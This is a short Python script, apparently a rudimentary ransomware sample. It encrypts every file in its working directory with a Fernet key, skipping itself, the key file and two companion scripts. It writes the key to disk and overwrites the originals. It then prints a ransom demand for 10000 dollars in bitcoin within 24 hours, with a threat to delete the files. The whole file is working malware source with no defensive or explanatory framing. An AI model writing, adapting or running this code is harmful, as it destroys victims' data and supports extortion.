import os
import time
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "main.py" or file == "thekey.key" or file == "Graphiques.py" or file == "decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)
print(files)


key = Fernet.generate_key()
with open("thekey.key", "wb")as thekey:
    thekey.write(key)
for file in files:
    with open(file, "rb")as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
print("All your files are encrypted send me 10000$ in bitcoin or I delete them. You got 24 hours")
time.sleep(10)